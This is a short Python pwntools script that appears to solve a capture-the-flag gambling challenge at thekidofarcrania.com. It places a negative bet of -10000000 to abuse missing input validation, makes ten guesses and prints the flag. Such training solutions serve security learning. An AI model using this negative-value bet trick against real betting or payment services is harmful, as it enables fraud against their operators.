from pwn import *

r = remote('thekidofarcrania.com', 10001)

r.sendlineafter(b'Are you ready? Y/N : ', b'Y')
r.sendlineafter(b'Place a Bet : ', b'-10000000')
for _ in range(10):
    r.sendlineafter(b'Make a Guess :', b'11')
r.recvuntil(b'The flag is ')
FLAG = r.recvline().decode()[:-1]
print(FLAG)